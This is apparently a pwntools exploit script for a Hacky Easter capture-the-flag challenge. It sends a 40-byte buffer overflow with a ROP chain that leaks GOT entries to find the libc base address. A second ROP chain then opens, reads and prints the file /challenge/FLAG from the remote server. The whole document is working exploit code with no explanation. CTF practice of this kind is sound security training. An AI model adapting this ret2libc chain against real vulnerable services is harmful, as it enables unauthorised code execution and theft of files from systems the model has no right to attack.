#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('main')
libc = ELF('./libc2.so')

offset = 40
io = remote("ch.hackyeaster.com", 2314)
io.recvuntil("do: ")

rop = ROP(exe)
rop.puts(exe.got['puts'])
rop.puts(exe.got['gets'])
rop.puts(exe.got['printf'])
rop.main()

print(rop.dump())
io.sendline(fit({ offset: rop.chain()}))

leak = io.recvline()[:-1]
leak = u64(leak.ljust(8, b'\x00'))
print(hex(leak))

leak2 = io.recvline()[:-1]
leak2 = u64(leak2.ljust(8, b'\x00'))
print(hex(leak2))

leak3 = io.recvline()[:-1]
leak3 = u64(leak3.ljust(8, b'\x00'))
print(hex(leak3))

libc.address = leak - libc.sym['puts']
print(hex(libc.address)) # sanity check

io.recvuntil("do: ")
rop = ROP(libc)

file = b"/challenge/FLAG"
c = exe.bss(30) # some scratch space
rop.read(0, c, len(file)) # read stdin to bss
rop.open(c, 0) # open FLAG file
rop.read(3, c, 400) # read contentto bss
rop.write(1, c , 400) # write bss to stdout

io.sendline(fit({ offset: rop.chain()}))
io.sendline(file)
io.interactive()
